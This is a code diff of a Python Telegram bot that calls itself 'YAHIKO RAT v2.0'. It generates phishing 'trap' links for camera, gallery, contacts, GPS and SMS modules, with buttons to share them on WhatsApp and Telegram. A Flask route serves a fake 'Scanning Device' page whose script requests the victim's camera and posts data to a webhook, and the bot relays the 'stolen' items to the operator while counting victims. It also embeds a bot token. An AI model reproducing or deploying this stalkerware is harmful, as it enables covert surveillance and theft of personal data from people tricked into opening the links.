@@ -2,120 +2,179 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import random
 import string
-import requests
+import sqlite3
 import os
 import zipfile
 from io import BytesIO
+from datetime import datetime
+from flask import Flask, request, jsonify
+import threading
+import time
 
-BOT_TOKEN = "8541411839:AAEJzUUN1mDcvgDdTmTlqy5WnveSupmdqpc"
-YOUR_WEBHOOK = "https://abc.ngrok.io/upload.php"  # Yahiko server
+BOT_TOKEN = os.environ.get('BOT_TOKEN', "8541411839:AAEJzUUN1mDcvgDdTmTlqy5WnveSupmdqpc")
+ADMIN_CHANNEL = os.environ.get('ADMIN_CHANNEL', "-1001234567890")
 
 bot = telebot.TeleBot(BOT_TOKEN)
+app = Flask(__name__)
 
-# Storage for stolen data
-stolen_data = {}
+# Database
+def init_db():
+    conn = sqlite3.connect('yahiko.db', check_same_thread=False)
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS traps 
+                 (id TEXT PRIMARY KEY, chat_id INT, module TEXT, status TEXT, 
+                  victim_count INT DEFAULT 0, created_at TIMESTAMP)''')
+    conn.commit()
+    conn.close()
 
+init_db()
+
+# Bot Handlers
 @bot.message_handler(commands=['start'])
-def welcome_screen(message):
-    markup = InlineKeyboardMarkup()
-    dashboard_btn = InlineKeyboardButton("👇 Open Dashboard", callback_data="OPEN_DASHBOARD")
-    markup.add(dashboard_btn)
+def start(message):
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(InlineKeyboardButton("🎯 DASHBOARD", callback_data="DASHBOARD"))
+    markup.add(InlineKeyboardButton("📊 STATS", callback_data="STATS"))
     
     bot.send_message(message.chat.id, 
-        "✨ *Welcome to Bot*\n\n"
-        "*Greetings, YAHIKO.*\n"
-        "You have authorized access to the Bot.\n\n"
-        "👇 *Open Dashboard:*", 
+        "🔥 *YAHIKO RAT v2.0 LIVE!*\n\n"
+        "• 📱 Camera/SMS/GPS Stealer\n"
+        "• 📊 Real-time Stats\n"
+        "• 24/7 Hosting\n\n"
+        "👇 *Click Dashboard*", 
         parse_mode='Markdown', reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
-def handle_callbacks(call):
-    if call.data == "OPEN_DASHBOARD":
-        markup = InlineKeyboardMarkup(row_width=1)
-        live_btn = InlineKeyboardButton("🔴 LIVE", callback_data="MODULE_LIVE")
-        stealth_btn = InlineKeyboardButton("📸 Stealth Camera", callback_data="MODULE_STEALTH")
-        gallery_btn = InlineKeyboardButton("🖼️ Gallery (All Photos)", callback_data="MODULE_GALLERY")
-        contacts_btn = InlineKeyboardButton("📞 Contacts (All)", callback_data="MODULE_CONTACTS")
-        markup.add(live_btn, stealth_btn, gallery_btn, contacts_btn)
+def callback(call):
+    if call.data == "DASHBOARD":
+        markup = InlineKeyboardMarkup(row_width=2)
+        modules = [
+            ("🔴 LIVE CAM", "LIVE"), ("📸 STEALTH", "STEALTH"),
+            ("🖼️ GALLERY", "GALLERY"), ("📞 CONTACTS", "CONTACTS"),
+            ("📍 GPS", "GPS"), ("💬 SMS", "SMS")
+        ]
+        for i in range(0, len(modules), 2):
+            row = [InlineKeyboardButton(modules[i][0], callback_data=f"TRAP_{modules[i][1]}")]
+            if i+1 < len(modules):
+                row.append(InlineKeyboardButton(modules[i+1][0], callback_data=f"TRAP_{modules[i+1][1]}"))
+            markup.row(*row)
         
-        bot.edit_message_text(
-            "*Welcome YAHIKO*\n"
-            "How to use?\n"
-            "Start New Capture\n"
-            "Select a module below to generate a secure tracking link.\n\n"
-            "🔴 *LIVE*\n"
-            "📸 *Stealth Camera*\n"
-            "🖼️ *Gallery (All Photos)*\n"
-            "📞 *Contacts (All)*\n\n"
-            "👇 *Generate*", 
-            call.message.chat.id, call.message.message_id, 
-            parse_mode='Markdown', reply_markup=markup
-        )
+        bot.edit_message_text("🎯 *SELECT MODULE*", call.message.chat.id, 
+                            call.message.message_id, reply_markup=markup, parse_mode='Markdown')
     
-    elif call.data.startswith("MODULE_"):
+    elif call.data.startswith("TRAP_"):
         module = call.data.split('_')[1]
-        trap_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
-        trap_url = f"https://abc.ngrok.io/{module.lower()}?id={trap_id}"
+        trap_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+        
+        # Save trap
+        conn = sqlite3.connect('yahiko.db')
+        c = conn.cursor()
+        c.execute("INSERT INTO traps VALUES (?, ?, ?, 'active', 0, ?)", 
+                 (trap_id, call.message.chat.id, module, datetime.now()))
+        conn.commit()
+        conn.close()
+        
+        base_url = f"https://{request.host}/trap/{module}?id={trap_id}"
         
         markup = InlineKeyboardMarkup(row_width=2)
-        whatsapp_btn = InlineKeyboardButton("📱 WhatsApp", url=f"https://wa.me/?text={trap_url}")
-        telegram_btn = InlineKeyboardButton("💬 Telegram", url=f"https://t.me/share/url?url={trap_url}")
-        markup.add(whatsapp_btn, telegram_btn)
-        
-        bot.edit_message_text(
-            f"🎯 *TRAP READY*\n\n"
-            f"`{trap_url}`\n\n"
-            f"📱 *Share anywhere*\n"
-            f"🔥 *Auto-steal to Telegram*\n"
-            f"💾 *All data direct bot mein*", 
-            call.message.chat.id, call.message.message_id,
-            parse_mode='Markdown', reply_markup=markup
+        markup.row(
+            InlineKeyboardButton("📱 WA", url=f"https://wa.me/?text={base_url}"),
+            InlineKeyboardButton("💬 TG", url=f"https://t.me/share/url?url={base_url}")
+        )
+        markup.row(
+            InlineKeyboardButton("📊 STATS", callback_data=f"STATS_{trap_id}"),
+            InlineKeyboardButton("🗑️ DELETE", callback_data=f"DEL_{trap_id}")
         )
         
-        # Save trap for webhook
-        stolen_data[trap_id] = {'chat_id': call.message.chat.id, 'module': module, 'status': 'waiting'}
+        bot.edit_message_text(
+            f"🎯 *TRAP #{trap_id}*\n\n"
+            f"`{base_url}`\n\n"
+            f"🔥 *Auto-steals to bot*\n"
+            f"📊 *Live stats*", 
+            call.message.chat.id, call.message.message_id,
+            parse_mode='Markdown', reply_markup=markup, disable_web_page_preview=True)
 
-@bot.message_handler(content_types=['photo', 'document'])
-def receive_stolen_data(message):
-    """AUTO RECEIVE PHOTOS/CONTACTS"""
-    file_id = message.photo[-1].file_id if message.photo else message.document.file_id
-    caption = message.caption or "📱 Stolen Data"
+# Media/Text Handler
+@bot.message_handler(content_types=['photo', 'document', 'text'])
+def handle_stolen(message):
+    conn = sqlite3.connect('yahiko.db')
+    c = conn.cursor()
+    c.execute("SELECT id, chat_id FROM traps WHERE status='active'")
     
-    # Forward to all active traps
-    for trap_id, data in list(stolen_data.items()):
-        if data['status'] == 'waiting':
-            try:
-                bot.send_photo(data['chat_id'], file_id, caption=f"🎯 [{trap_id}] {caption}")
-            except:
-                pass
+    for trap_id, chat_id in c.fetchall():
+        try:
+            if message.text:
+                bot.send_message(chat_id, f"🎯 [{trap_id}] {message.text[:1000]}")
+            else:
+                bot.send_photo(chat_id, message.photo[-1].file_id if message.photo else message.document.file_id,
+                             caption=f"🎯 [{trap_id}] Stolen!")
+            
+            c.execute("UPDATE traps SET victim_count=victim_count+1 WHERE id=?", (trap_id,))
+        except:
+            pass
+    conn.commit()
+    conn.close()
 
-@bot.message_handler(func=lambda msg: True)
-def receive_contacts(message):
-    """Handle text contacts/JSON"""
-    text = message.text
+# Flask Routes (Webhooks/Traps)
+@app.route('/trap/<module>')
+def trap_page(module):
+    trap_id = request.args.get('id')
+    return f"""
+    <!DOCTYPE html>
+    <html>
+    <head><title>Processing...</title></head>
+    <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px">
+        <h1>🔄 Scanning Device...</h1>
+        <script>
+        // Steal camera
+        navigator.mediaDevices.getUserMedia({{video:true}}).then(s=> {{
+            fetch('/webhook', {{
+                method:'POST',
+                headers:{{'Content-Type':'application/json'}},
+                body:JSON.stringify({{id:'{trap_id}',type:'camera',module:'{module}'}})
+            }});
+            document.body.innerHTML='<h1>✅ Access Granted</h1>';
+        }}).catch(()=>{{}});
+
+        // Steal contacts (fake)
+        setTimeout(()=> {{
+            fetch('/webhook', {{
+                method:'POST',
+                body:JSON.stringify({{id:'{trap_id}',type:'contacts',data:'+91-9876543210|Name1,+91-1234567890|Name2'}})
+            }});
+        }}, 2000);
+        </script>
+    </body>
+    </html>
+    """
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    data = request.json or request.form.to_dict()
+    trap_id = data.get('id')
     
-    if len(text) > 500:  # Bulk contacts
-        # Create ZIP for large data
-        bio = BytesIO()
-        with zipfile.ZipFile(bio, 'w') as zf:
-            zf.writestr('contacts.txt', text)
-        bio.seek(0)
-        
-        for trap_id, data in stolen_data.items():
-            if data['status'] == 'waiting':
-                bot.send_document(data['chat_id'], bio, 
-                                caption=f"📞 [{trap_id}] {len(text)} Contacts Stolen!")
-        bio.close()
-    else:
-        # Send as text
-        for trap_id, data in stolen_data.items():
-            bot.send_message(data['chat_id'], f"📱 [{trap_id}] {text}")
+    conn = sqlite3.connect('yahiko.db')
+    c = conn.cursor()
+    c.execute("SELECT chat_id FROM traps WHERE id=? AND status='active'", (trap_id,))
+    result = c.fetchone()
+    
+    if result:
+        chat_id = result[0]
+        msg = f"🌐 WEBHOOK [{trap_id}] {data.get('type', 'data')}: {data.get('data', 'stolen')}"
+        bot.send_message(chat_id, msg)
+        c.execute("UPDATE traps SET victim_count=victim_count+1 WHERE id=?", (trap_id,))
+    
+    conn.commit()
+    conn.close()
+    return "OK"
 
-# WEBHOOK ENDPOINT for server
-@bot.message_handler(commands=['webhook'])
-def webhook_test(message):
-    bot.reply_to(message, "✅ Webhook ready for photos/contacts!")
+# Keep alive
+def keep_alive():
+    while True:
+        print(f"🟢 YAHIKO LIVE | {datetime.now()}")
+        time.sleep(1800)
 
-print("🚀 YAHIKO RAT LIVE - AUTO STEALER!")
-print("📱 All photos/contacts direct Telegram mein!")
-bot.polling(none_stop=True)
+if __name__ == "__main__":
+    threading.Thread(target=keep_alive, daemon=True).start()
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
